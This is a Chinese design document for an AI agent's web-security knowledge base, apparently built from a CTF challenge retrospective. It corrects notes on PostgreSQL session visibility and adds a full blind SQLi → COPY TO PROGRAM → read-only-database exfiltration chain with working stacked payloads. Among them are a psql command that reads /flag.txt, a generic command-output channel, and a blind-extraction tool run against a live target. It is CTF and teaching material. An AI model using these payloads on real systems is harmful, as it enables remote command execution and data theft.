# 2026-09-29 PG 只读外带知识修正与扩充（C1/C2/C3）+ 盲注提取工具（C5）

> 状态：**已实施（Phase 6 审计通过）** | 入口：Planetary Probe 分析复盘（build 会话）→ 用户确认执行 C1→C2→C3→C5，不做 C4
> as-built：doc 净 +2 / sqli-advanced +53−1 / web-methodology +5 / web-analysis +2−1（展开 429）/ 新脚本 298 行（有效 220；S6 时 205 → 拆 S6a/S6b，评审修复 +15）/ 测试 23/23（mock，含评审修复用例）+ 活靶机 e2e（spacedb，65 请求，两轮一致）；记忆库 6937（主）+ 6938（调优版）；Phase 6 审计三周期通过；外部评审 5 项处置见 progress
> 来源痛点：① 已沉淀知识含两条被 clean 复测证伪的错误机制（psql"认证死锁"、nohup"不可靠"），真因=pg_stat_activity 跨角色可见性遮蔽；② web-analysis KB 对 PG 盲注→COPY TO PROGRAM→只读库外带链路零覆盖；③ 失败切换表缺"监控视图污染/行漂移/长挂请求/失败计数"四类场景；④ 盲注提取脚本在单次分析中手写 3 版
> 关联：`2026-09-27-knowledge-first-strategy.md`（知识优先）、`2026-09-27-cookie-jar-kb-and-attribution-command.md`（同模式：复盘→KB 增补）、`2026-09-23-mechanism-corrections-and-retro-methodology.md`（错误知识修正 + 追加更正条目 + 委派存储先例）
> 实施进度见 `progress-2026-09-29-pg-exfil-knowledge-and-blind-extract.md`
> C4（build 会话规则触达）经用户决策不实施——保留为后续观察项

## §1 背景与目标

**来源痛点（复盘数据）**：

1. **错误知识已沉淀**：`docs/分析/web/分析-Planetary-Probe.md` §6/§8 与记忆库旧条目把"载具会话不可见"误诊为"psql 认证死锁"与"nohup 不可靠"。clean 复测（同实例对照实验）证伪：默认 psql 可连接执行（`psql spacedb -c 'select 1'` 输出正常结果表）；`nohup + --username=probe` 持久正常且可携带 flag；真因 = **pg_stat_activity 对非同角色会话隐藏 query**（显示 `<insufficient privilege>`、state 为 NULL——读取方无 `pg_read_all_stats` 时）。
2. **KB 链路缺口**：`sqli-advanced.md` 的 PG 命令执行仅"superuser + COPY FROM PROGRAM"一句（全仓 grep：`pg_execute_server_program`/`TO PROGRAM`/`insufficient privilege`/`psql` 零命中）；`COPY (SELECT ...) TO PROGRAM`（无需文件/表权限）、只读库约束、psql 载具与角色可见性、pg_stat_activity 外带通道、读取侧三陷阱（自匹配/滞留查询/行漂移）均无覆盖。
3. **失败切换缺口**：`web-methodology.md §4a` 无"监控视图查询无命中先查可见性/自匹配""存在性判定间歇真假=行漂移""长挂请求占用 worker""连续失败计数→技法词二次检索/stuck-protocol"四类切换项。
4. **工具缺口**：盲注提取（长度探测 + 并行 ascii 二分 + 重试）在分析中手写 3 版；`web-analysis/scripts/` 无对应工具（`web_helpers.py` 无盲注函数）。

**用户决策**：做 C1（错误知识修正）→ C2（sqli-advanced 扩充）→ C3（失败切换表增行）→ C5（盲注提取工具）；不做 C4。

**目标**：① 修正分析文档两处错误机制 + 追加 1 条更正记忆条目（委派领域 agent 存储，含"被取代"声明）；② sqli-advanced 新增「PostgreSQL 盲注→COPY TO PROGRAM→只读库外带」完整节 + §3 PG 行修正 + 索引触发行更新；③ web-methodology §4 +1 条、§4a +4 行；④ 新建 `blind_extract.py`（库 + CLI）+ 回归测试 + prompt 脚本表 +1 行。

**预期收益（四维度）**：准确度显著（消除错误机制复发 + 链路可复用）；速度显著（同类盲注题省 30-60 分钟：免探索、免手写提取）；轮次/上下文：KB 按需读取、脚本表 +1 行（web-analysis 展开 428→429，<450 红线）。

## §2 技术方案

### 2.1 C1-a：分析文档修正（`docs/分析/web/分析-Planetary-Probe.md`）

**§6 整节替换**（原"psql 认证坑"两 bullet → 下述三 bullet）：

```markdown
### 6. psql 载具与角色可见性

- COPY 程序以 OS 用户 postgres 运行；`psql --username=probe --dbname=spacedb`（应用账号，本地免密）可稳定连接与执行。
- **关键机制**：pg_stat_activity 对**非同角色**会话隐藏 query 文本（显示 `<insufficient privilege>`、state 为 NULL——probe 无 `pg_read_all_stats`）。默认用户（postgres 角色）起的 psql 会话读不到内容，表现为"会话不存在"。因此载具 psql 必须与注入会话**同角色**连接（`--username=probe`），否则外带通道不可读。
- 排查提示：判定"命令是否执行"不能只看 query 文本可见性——用同角色载具交叉验证，或按 `usename` 做行级计数。
```

**§7 末 bullet 微调**：`- 盲 oracle 逐字符读回：…` 句尾追加 `（读取前提：载具与读取方同角色，见 §6）`。

**§8 标题微调**：`### 8. 自匹配坑（最费时的一课）` → `### 8. 读取侧陷阱（最费时的一课）`（节内新增 ④ 滞留查询后，标题覆盖两类陷阱）。

**§8 修复组合拳 ③ 替换 + 新增 ④**：

```markdown
  3. 后台化可用且推荐（`nohup ... &` 让 COPY 快速返回，避免长挂请求占用应用 worker）；但必须带 `--username=probe`——默认用户会话对 probe 不可见（见 §6）。
  4. 连接池 idle 连接会**保留最后一条 query 文本**——用 `LIKE '%marker%'` 判定"存在性"会命中已完成的请求（假阳性）；存在性判定用行首前缀过滤。
```

### 2.2 C1-b：记忆库更正条目（追加式，委派存储）

**方法**：`store_knowledge` 为纯追加（无 update/delete）→ 追加 1 条更正条目（承接 09-23 先例）；由**委派 web-analysis 子 agent** 执行存储（evolve 不直接 store）。条目全文稿：

```text
PostgreSQL 盲注→COPY TO PROGRAM→只读库外带链路（更正版；检索到旧条目「PostgreSQL 只读库下盲 SQLi 怎么拿 flag」中「psql 认证死锁 / nohup 不可靠」表述时以本条为准）：

适用：布尔/时间盲 SQLi 已确认、引擎 PostgreSQL、写库被拒（只读或角色无写权限）、当前角色属于 pg_execute_server_program。

链路：
1. 输入转小写自检：'ZZ'='zz' 真 + ascii('A')=65 假 → payload 全小写；psql 用 --username= 长选项（-U 被转小写破坏）。
2. 只读判定：current_setting('transaction_read_only')='on' 或 pg_settings.default_transaction_read_only='on' → 转外带；角色三查 pg_has_role(current_user,'pg_execute_server_program','member')（PG≥11 非 superuser 可用）。
3. 堆叠验证：'; COPY (SELECT 'x') TO PROGRAM 'sleep 4'; SELECT 'x'; -- 与基线计时对比（+4s=执行）。TO PROGRAM 只需源查询 SELECT+该角色，不需文件/表权限；FROM PROGRAM 需向目标表 INSERT（只读不可用）。
4. 载具（外带通道）：COPY TO PROGRAM 起 psql 会话，数据放 query 文本：
   '; COPY (SELECT 'x') TO PROGRAM 'nohup psql --username=<app_user> --dbname=<db> -c "select pg_sleep(3600) /* $(cat /flag.txt) */" >/dev/null 2>&1 &'; SELECT 'x'; --
5. 读取前提（真因，防误判）：pg_stat_activity 对非同角色会话隐藏 query（<insufficient privilege>、state NULL；读取方无 pg_read_all_stats 时）→ 载具必须与注入会话同角色（--username=<app_user>）。"会话不存在/命令没跑"的常见误判来源=跨角色遮蔽，而非认证失败。
6. 读取：pid<>pg_backend_pid() + 行首前缀过滤（query LIKE 'select pg_sleep(3600)%'）+ 固定行（先取 pid）；substr+ascii 二分并行提取。
7. 三陷阱：自匹配（检查请求自身文本含 marker）；滞留查询（池 idle 连接保留最后一条 query）；行漂移（子查询逐轮重算 → 固定 pid）。
8. 命令输出读取：载具注释放 $(任意命令 2>&1 | head -c N)，可把任意命令输出带回库内盲读。

证据等级：observed（全链在 PostgreSQL 实例复现：TO PROGRAM 计时对照、同角色/异角色可见性对照、外带提取成功）。
已验证范围：堆叠语句可用 + 应用账号本地免密 + psql 二进制存在的场景。
未测清单：无堆叠语句（单语句限制）时的替代路径；无 psql 环境；时间盲变体；读取方有 pg_read_all_stats 时的跨角色读取。
```

### 2.3 C2：`sqli-advanced.md` 扩充

**改动 1 —— §3 PostgreSQL 行修正**（1 行替换）：

- 原：`**COPY FROM PROGRAM 命令执行**（superuser: `CREATE TABLE cmd_exec(o text); COPY cmd_exec FROM PROGRAM 'id'`）`
- 新：`**COPY PROGRAM 命令执行**（PG≥11 非 superuser 经 `pg_execute_server_program` 角色：`COPY (SELECT 'x') TO PROGRAM 'id'` 无需目标表/文件权限；`CREATE TABLE ...; COPY ... FROM PROGRAM 'id'` 需写表权限）｜**盲注→RCE→只读库外带完整链路见 §3a**`

**改动 2 —— 新增 `### §3a` 节**（插入 §3 的 SQLite 行之后、`## 4.` 之前；全文稿）：

````markdown
### §3a PostgreSQL：盲注 → COPY TO PROGRAM → 只读库外带

**适用**：布尔/时间盲 SQLi 已确认且引擎为 PostgreSQL；库只读或角色无写权限；当前角色无 `pg_read_server_files`/`pg_write_server_files`，但属于 `pg_execute_server_program` —— 可用原语为 COPY PROGRAM（命令执行 + 把输出经数据库内可见通道盲读回来）。

**1. 输入处理特征自检（先做，影响全部 payload）**

- 输入被整体转小写：`'ZZ'='zz'` 为真、`ascii('A')=65` 为假（实为 `ascii('a')=97`）→ payload 全小写；psql 选项用 `--username=`/`--dbname=` 长选项（`-U` 会被转小写破坏）。
- 检测：`<闭合>' AND ascii('A')=65-- -`（假=被转小写；`ascii` 不受 collation 影响，为判定锚点）与 `<闭合>' AND 'ZZ'='zz'-- -`（真）交叉印证。

**2. 引擎与能力三查**

- 引擎指纹：`chr(65)`、`quote_ident('a')`、`'5'::int=5`、`'abc'~'b'`、`current_database()` 可求值；`sqlite_version()`/`sqlite_master`/`@@version_comment` 报错 → PostgreSQL。
- 只读判定：`current_setting('transaction_read_only')='on'` 或 `pg_settings.default_transaction_read_only='on'` → 写表类操作（INSERT/UPDATE/DELETE/CREATE/COPY 入库）全不可用，直接转命令执行+外带（不要先尝试 INSERT/CREATE 路线）；文件读写另受 `pg_read_server_files`/`pg_write_server_files` 角色约束。
- 角色三查：`pg_has_role(current_user,'pg_read_server_files','member')` / `'pg_write_server_files'` / `'pg_execute_server_program'`。第三项为真即具备 COPY PROGRAM 权限（PG≥11 预定义角色，非 superuser 可用）。

**3. 堆叠语句与命令执行验证**

- 堆叠前提：`<闭合>'; SELECT 'x'; --` 返回应用正常态 → 多语句可用（应用通常取最后一条语句的结果集，末尾补 `SELECT 'x'` 保持返回态）。
- 执行验证（计时）：`<闭合>'; COPY (SELECT 'x') TO PROGRAM 'sleep 4'; SELECT 'x'; --` 与基线对比，+4s 即执行成功。
- 权限边界：`COPY (SELECT ...) TO PROGRAM 'cmd'` 只需源查询 SELECT + `pg_execute_server_program`，**不需要文件写权限/目标表**；`COPY ... FROM PROGRAM` 需要向目标表写入（只读/无 INSERT 时不可用）。

**4. 外带载具：psql 会话的 query 文本**

- 载具必须与注入会话**同角色**连接：pg_stat_activity 对非同角色会话隐藏 query 文本（显示 `<insufficient privilege>`、state 为 NULL；读取方无 `pg_read_all_stats` 时）——用默认用户起的 psql 会话读不到内容，表现为"会话不存在"。用注入所用的应用账号连接（本地连接常免密）；读取方可用 `pg_has_role(current_user,'pg_read_all_stats','member')` 自检是否具备跨角色读取权限。
- 触发模板（后台化让触发请求快速返回；`$(...)` 由 shell 在 psql 启动前替换）：

```bash
<闭合>'; COPY (SELECT 'x') TO PROGRAM 'nohup psql --username=<app_user> --dbname=<db> -c "select pg_sleep(3600) /* <marker> $(cat /flag.txt 2>/dev/null) */" >/dev/null 2>&1 &'; SELECT 'x'; --
```

- 原理：内容进入 psql 发送的 SQL 文本 → 常驻 `pg_stat_activity.query`；`pg_sleep` 保活；应用/网关超时只断客户端连接，服务端 psql 会话继续执行。
- 读取侧（盲 oracle 逐字符）：先 `length()` 探长，再 `substr(query, position('<marker>' in query) + N)` + `ascii()` 二分；行选择必须固定（见下）。

**5. 读取侧三陷阱（判定纪律）**

| 陷阱 | 现象 | 排除 |
|------|------|------|
| 自匹配 | 检查请求自身文本含筛选字面量（marker/`%pattern%`）→ 计数/`LIKE` 假阳性 | `pid <> pg_backend_pid()`；并行提取用**行首前缀过滤**（`query LIKE 'select pg_sleep(3600)%'`——注入请求以应用模板开头，永不匹配） |
| 滞留查询 | 连接池 idle 连接保留最后一条 query 文本 → "存在性"判定命中已完成请求 | 行首前缀 + 固定行：先取 `pid`，后续查询 `WHERE pid=<pid>` |
| 行漂移 | 子查询每轮重算，提取中途行被替换 → 字符混读 | 固定 `pid`；或 `ORDER BY backend_start DESC LIMIT 1` 容忍同内容多行冗余 |

**6. 命令输出读取（通用）**

- 载具注释放 `$(<任意命令> 2>&1 | head -c <N>)` 即可把任意命令输出带回库内盲读——读文件/环境/工具输出全可用。
- 对称方向（读其他会话正在执行的 query，需相应可见性权限）：见「增补」节 processlist 竞态泄露条目。

**7. 排错**

- 会话"不存在" → 先查角色可见性（换同角色账号），再查命令是否真的执行（同角色载具交叉验证）。
- 存在性间歇真假 → 自匹配/行漂移，按 §5 固定行。
- COPY 无结果集导致应用报错 → 末尾补 `SELECT 'x'`；无权限 → 复核角色三查。
````

**改动 3 —— `agents/web-analysis.md` 索引行替换**（1 行替换）：

- 原：`| `sqli-advanced.md` | SQL 注入实战（WAF 绕过全族/无列名/堆叠预处理/DNS OOB/写 shell/sqlmap 进阶） |`
- 新：`| `sqli-advanced.md` | SQL 注入实战（WAF 绕过全族/无列名/堆叠预处理/DNS OOB/写 shell/PG 命令执行与只读库外带/sqlmap 进阶） |`

### 2.4 C3：`web-methodology.md` 增补

**§4 漏洞验证原则 +1 条**（追加在既有 4 条之后）：

```markdown
5. **观测通道自检** — 用监控视图/日志/自身痕迹当 oracle 时，先排除三类污染再解释结果：自匹配（查询自身文本含筛选字面量）、可见性遮蔽（跨角色/权限差异导致字段为空或占位符）、滞留数据（连接池/缓存的旧状态）。
```

**§4a 执行失败切换表 +4 行**（追加在表末尾）：

```markdown
| 监控视图/日志查询无命中或全为空 | 先查可见性（跨角色会话 query 被遮蔽为 `<insufficient privilege>`/NULL）与自匹配，再判断"进程未执行"；换同角色载具或改查行级元数据 |
| 存在性判定间歇性 True/False | 行漂移或滞留数据：固定行（pid/唯一键）+ 行首前缀过滤，排除查询自身与池连接的旧状态 |
| 需要长时运行的服务端命令（COPY PROGRAM 等） | 命令后台化（`nohup ... &`）让触发请求快速返回，避免长挂请求占用应用 worker |
| 同一方向连续失败 ≥3 次 | 换技法词二次检索记忆库（题目词/场景词不是召回键）；≥5 次执行 `stuck-protocol` skill（含 fresh-eyes 无记忆复核） |
```

### 2.5 C5：`blind_extract.py`（盲注提取通用工具）

**形态**：库 + CLI 双形态（先例 `bot_analyze.py`）；纯标准库 + requests（仓库既有依赖）。

**接口设计（规则 9 强类型）**：

```python
@dataclass
class OracleConfig:
    url_template: str          # 含 {payload}
    payload_template: str      # 含 {cond}
    true_match: str = ""       # match 模式：响应含此串=True
    false_match: str = ""      # match 模式：响应含此串=False（两者都未命中→按错误重试）
    mode: str = "match"        # match | timing
    timing_threshold_s: float = 3.0
    method: str = "GET"        # GET | POST
    data_template: str = ""    # POST form，含 {payload}
    json_template: str = ""    # POST JSON，含 {payload}
    headers: dict[str, str] = field(default_factory=dict)
    cookies: dict[str, str] = field(default_factory=dict)
    timeout_s: float = 20.0
    retries: int = 4           # 单次 oracle 失败重试（指数退避）

class BlindOracle:
    def check(self, cond: str) -> bool: ...                      # 单次布尔判定
    def length(self, expr: str, max_len: int = 200) -> int: ... # length()>=n 二分探测
    def char_at(self, expr: str, pos: int) -> int: ...          # ascii(substr()) 二分
    def extract(self, expr: str, max_len: int = 200, stop_chars: str = "", workers: int = 8) -> str: ...
```

**CLI 参数**：`--url/--payload-template/--true/--false/--mode/--timing-threshold/--method/--data/--json/--header/--cookie/--expr/--stop/--max-len/--workers/--verify-cond/--output`；`--output` 写 JSON（字段：`expr/result/requests/elapsed_s`）；`--stop` 命中即停止且该字符包含在结果内（如 `--stop '}'` 提取含 `}`）。

**内建防护**：`--verify-cond` 预检（先验一条已知为真的条件，防"可见性/自匹配导致全空静默失败"）；提取结果全空或全 `\x00/\xff` 时重试并显式告警；线程本地 session；每线程可选 delay；expr 为 SQL 表达式（子查询用括号包裹，可空结果建议套 `coalesce(expr,'')`）。

**测试**（`test_blind_extract.py`，沿用 `test_web_helpers.py` 的 check/exit 约定）：本地 mock server（`http.server` 线程）实现受控 oracle（解析条件内字面量并求值 `ascii(substr(...))`/`length(...)` 条件），覆盖：match 模式提取、`stop_chars`、timing 模式、重试（首请求故障）、`--verify-cond`、CLI smoke。

**e2e**（Phase 5 执行）：对活靶机 `https://planetary.web.2026.sunshinectf.games/probe` 用 CLI 提取 `current_database()`，期望 `spacedb`（~百级请求）；靶机不可用时降级，以 mock 测试为验收并留痕。

### 2.6 文件改动清单

| # | 文件 | 改动点 | 行数 |
|---|------|--------|------|
| C1-a | `docs/分析/web/分析-Planetary-Probe.md` | §6 整节替换、§7 末行追加括注、§8 标题替换、§8 ③ 替换 + ④ 新增 | 净 +2（§6 替换 +1 行、§8 ④ 新增 +1 行；§7/标题/③ 为行内替换） |
| C1-b | 记忆库（knowledge MCP，委派 web-analysis 子 agent） | 追加 1 条更正条目（旧条目保留） | +1 条 |
| C2-a | `web-analysis/knowledge-base/sqli-advanced.md` | §3 PG 行替换（1 行）+ 新增 `### §3a`（~52 行） | ~+52 / 1 替换 |
| C2-b | `agents/web-analysis.md` | sqli-advanced 索引行替换 | 1 行替换 |
| C3 | `web-analysis/knowledge-base/web-methodology.md` | §4 +1 条、§4a +4 行 | +5 |
| C5-a | `web-analysis/scripts/blind_extract.py` | 新文件（库 + CLI） | ≤200（不含注释/空行）——as-built：有效代码 205 → 拆 S6a/S6b（见 §3.1） |
| C5-b | `web-analysis/scripts/test_blind_extract.py` | 新文件（回归测试） | ~110 |
| C5-c | `agents/web-analysis.md` | 脚本表 +1 行 | +1 |

**明确不做**：C4（build 会话规则触达，用户决策排除）；触碰 `agents-rules/` 共享片段；修改 plugin；修改既有脚本（web_helpers.py 等）。

### 2.7 架构影响图

```
docs/分析/web/分析-Planetary-Probe.md ──§6/§7/§8 修正──→ 自身（分析文档，非运行时依赖）
记忆库（knowledge MCP）──委派 store──→ web-analysis 子 agent（追加更正条目；旧条目保留）
web-analysis/knowledge-base/sqli-advanced.md ──§3 行修正 + §3a 新增──→ 自身
agents/web-analysis.md ──索引行替换 + 脚本表 +1 行──→ 自身（展开 428→429）
web-analysis/knowledge-base/web-methodology.md ──§4/§4a 增补──→ 自身
web-analysis/scripts/blind_extract.py + test_blind_extract.py ──新文件──→ 脚本表引用（$AGENT_DIR/scripts/）
Plugin: 零改动
```

### 2.8 Phase 4.5 预算校验（展开行数预演）

| 项 | 现值 | 改后 | 红线 |
|----|------|------|------|
| web-analysis 展开 | 252 − 7 + 183 = **428** | 253 − 7 + 183 = **429** | ✓ <450 |

占位符 7 处不变；不触碰 `agents-rules/` 片段（C3 落在 web KB，非共享片段）；其余 agent 零影响。

### 2.9 关键技术决策

- **错误修正口径**：分析文档直接修正不留"更正注"（承接 09-23 编码规则）；记忆库因 `store_knowledge` 纯追加（无 update/delete），用"追加更正条目 + 被取代声明"（保护旧条目内有效信息）。
- **机制定名**："同角色可见性"（复测证据：默认 psql 可执行、`<insufficient privilege>` 遮蔽为真因）；全文不使用"认证死锁/密码提示"叙事。
- **C2 落 sqli-advanced.md**：PG 命令执行的自然归属；同主题补充不新建文件（~52 行接近 80 行阈值，但主题完全同族且该文件已有 `### §9a` 子节先例）。
- **C5 库 + CLI 双形态**：库供临时脚本 import；CLI 让"简单盲注题"免写脚本直接跑。测试用本地 mock（确定性、零外网）；e2e 用活靶机，失败可降级。
- **不触碰共享片段**：C3 的失败计数行落在 web KB §4a（agent 本地），避免 5 agent 联动回归面；C4 排除后不引入新的规则注入面。

## §3 实现规范

### 3.1 实施步骤

**S1. C1-a：分析文档修正**
- 文件：`docs/分析/web/分析-Planetary-Probe.md` | 预估：净 +2 行（§6 替换 +1、§8 ④ 新增 +1；§7/标题/③ 行内替换） | 依赖：无
- 要点：按 §2.1 四处（§6 整节替换、§7 末行追加括注、§8 标题微调、§8 ③ 替换 + ④ 新增）执行
- 验证点：① 回读 §6/§7/§8 自洽（可见性机制表述一致）；② grep `认证要求密码|死锁|不可靠` 该文件零命中；③ §7 代码块未动（仅末行追加括注）

**S2. C1-b：记忆库更正条目（委派存储）**
- 对象：knowledge MCP | 预估：+1 条 | 依赖：无（可与 S1 并行）
- 要点：委派 web-analysis 子 agent（**派发 prompt 内嵌 §2.2 全文稿**，逐字存储不改写、不补充，`store_knowledge`）；存储后用技法词两问自检检索（① "PostgreSQL 只读库 COPY TO PROGRAM 外带" ② "pg_stat_activity 跨角色可见性"）；仅存储+验证，不做分析、不改文件
- 验证点：① 存储成功（返回 stored/id）；② 两问检索命中且正文为更正版；③ 失败时输出"待用户重存"文本（= §2.2 全文稿）并留痕

**S3. C2-a：sqli-advanced 修正 + 新增**
- 文件：`web-analysis/knowledge-base/sqli-advanced.md` | 预估：~+52 行 / 1 行替换 | 依赖：无
- 要点：§3 PG 行按 §2.3 改动 1 替换；`### §3a` 按 §2.3 改动 2 全文稿插入（SQLite 行之后、`## 4.` 之前）
- 验证点：① §3a 自包含通读（无需其他文件即可执行）；② 叙事词 grep 零命中（`SunshineCTF|Planetary|planetary|sun\{|实测|本次|复盘`）；③ §3 行与 §3a 表述不矛盾；④ 代码块只装命令/结构；⑤ 列表项一行写完无硬折行

**S4. C2-b：web-analysis.md 索引行替换**
- 文件：`agents/web-analysis.md` | 预估：1 行替换 | 依赖：S3（§3a 就位后再指）
- 验证点：① 触发行含"PG 命令执行与只读库外带"；② 文件行数不变、占位符 7 处

**S5. C3：web-methodology 增补**
- 文件：`web-analysis/knowledge-base/web-methodology.md` | 预估：+5 行 | 依赖：无
- 要点：§4 追加第 5 条；§4a 表末尾追加 4 行（列数/风格与既有行一致）
- 验证点：① §4 第 5 条与既有 4 条风格一致；② §4a 表 4 行就位；③ 叙事词零命中

**S6a. C5-a1：blind_extract.py 核心（OracleConfig / BlindOracle）**
- 文件：`web-analysis/scripts/blind_extract.py`（新，核心部分） | 预估：≤200 有效行（不含注释/空行/docstring） | 依赖：无
- 要点：按 §2.5 接口（dataclass + 类）；module docstring 沿用 scripts 约定（summary/description/usage/level）
- 验证点：① compile 通过；② 库 import 无副作用（无网络请求）；③ 核心行为经 S7 的 T1-T13（mock oracle）验证
- as-built：整文件有效代码 205 行 > 200 → 按预案拆分为 S6a 核心（≈130 行）+ S6b CLI（≈75 行）；本子步骤为补录拆分

**S6b. C5-a2：blind_extract.py CLI（_kv / _parser / main）**
- 文件：同上（CLI 部分） | 预估：≤100 有效行 | 依赖：S6a
- 要点：argparse 全参数（§2.5 CLI 清单）；`--verify-cond` 预检；空/哨兵结果重试与告警；`--output` JSON
- 验证点：① `--help` 参数齐全；② CLI smoke 经 S7 的 T14-T16（子进程）验证

**S7. C5-b：test_blind_extract.py + 运行**
- 文件：`web-analysis/scripts/test_blind_extract.py`（新） | 预估：~110 行 | 依赖：S6
- 要点：本地 mock server（http.server 线程）实现受控 oracle；沿用 check/exit 约定；覆盖 §2.5 测试清单
- 验证点：① 全部 PASS；② 退出码 0；③ 测试仅访问 127.0.0.1

**S8. C5-c：web-analysis.md 脚本表 +1 行**
- 文件：`agents/web-analysis.md` | 预估：+1 行 | 依赖：S6
- 验证点：① 行格式与既有 6 行一致（模块|依赖|用途|关键函数）；② 展开行数复算 = 429；③ 占位符 7 处

**S9. C5-d：e2e（活靶机）**
- 文件：无改动 | 依赖：S7
- 要点：用 CLI 对 `https://planetary.web.2026.sunshinectf.games/probe` 提取 `current_database()`，期望 `spacedb`；请求量 ~百级；结果落本会话任务目录（无任务目录时用插件临时目录）
- 验证点：① 提取结果 = `spacedb`；② 靶机不可用时降级（记录降级原因，以 mock 测试为验收，不阻塞）

**S10. 全量验证与收尾**
- 文件：无改动 | 依赖：S1-S9
- 验证点：① 本次产出文件叙事词 grep 零命中；② web-analysis 展开行数复算 = 429、占位符 7；③ `test_web_helpers.py` 既有测试仍通过；④ 进度文档落盘；⑤ 需求文档 §4 逐条核对

### 3.2 编码规则

- KB 正文遵守 `$SHARED_DIR/knowledge-base/knowledge-writing-guide.md`（写前已读）：零来源叙事、一行写完不硬折行、代码块只装命令/结构、具体值代替抽象
- 引用一律 `$AGENT_DIR`/`$OPENCODE_ROOT` 变量形式；不引用 `docs/`
- 脚本沿用既有 scripts 约定（module docstring、requests 依赖、stdlib 优先、测试 check/exit 模式）
- 记忆库写入只经委派（evolve 不直接 store）；更正条目含"结论三件套"（证据等级 + 已验证范围 + 未测清单）
- 不触碰 `agents-rules/` 共享片段与 plugin

## §4 验收标准

**功能验收**：C1-a 四处修正落地且自洽；C1-b 更正条目可经技法词检索命中；C2 §3a 含"适用/检查/利用/陷阱/排错"五要素且索引可达；C3 §4/§4a 就位；C5 mock 测试全 PASS + 活靶机 e2e 成功（或降级留痕）。

**回归验收**：目标文件外零改动；web-analysis 展开行数 429（<450）；占位符 7 处不变；`test_web_helpers.py` 通过；`blind_extract.py` 不引入新第三方依赖（requests 已在）；既有 KB 文件除目标节外零改动。

**架构验收**：KB 改动归属 `web-analysis/knowledge-base/`；脚本归属 `web-analysis/scripts/`；记忆库写入经委派（evolve 不直接 store）；零 plugin 改动；无 `docs/` 引用；无跨目录反向引用。

## §5 与现有需求文档的关系

- **承接** Planetary Probe 复盘候选 C1/C2/C3/C5；C4（build 会话规则触达）经用户决策不实施——观察项：若后续再出现 build 会话执行分析任务，重新评估规则触达方案。
- **同模式先例** `2026-09-23-mechanism-corrections-and-retro-methodology.md`：错误知识修正 + 追加更正条目 + 委派存储；其"writeup 直接修正不留更正注"编码规则沿用。
- **承接链** `2026-09-27-knowledge-first-strategy.md`（知识优先）与 `2026-09-27-cookie-jar-kb-and-attribution-command.md`（复盘→KB 增补）：本次同时修正上一轮沉淀中的错误表述，是"知识消费闭环"的反面验证（消费才暴露错误）。
- 与 `pending-items.md`、`2026-09-27-gopher-ssrf-tooling-and-knowledge.md` 无交集。
